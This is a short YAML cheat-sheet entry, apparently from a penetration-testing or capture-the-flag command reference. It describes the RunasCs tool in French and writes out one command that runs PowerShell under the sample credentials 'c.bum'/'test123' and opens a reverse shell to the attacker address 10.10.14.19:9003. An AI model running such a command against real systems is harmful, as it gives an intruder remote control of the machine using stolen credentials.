---
description: |
  RunasCs est un utilitaire qui permet d'exécuter des processus spécifiques avec des autorisations différentes de celles de la connexion actuelle de l'utilisateur, à l'aide d'informations d'identification explicites. Cet outil est une version améliorée et ouverte de runas.exe, le programme intégré de Windows, qui résout certaines limitations.

  Command Reference:

    Username: c.bum

    Password: test123

    Command: Powershell

    Attacker IP & port for reverse shell: 10.10.14.19:9003

command: |
  .\RunasCs.exe c.bum test123 powershell -r 10.10.14.19:9003

items:
  - Shell
services:
  - 
OS:
  - Windows
  - Approved-tool
attack_types:
  - Exploitation
  - Persistance
references:
  - https://github.com/antonioCoco/RunasCs
---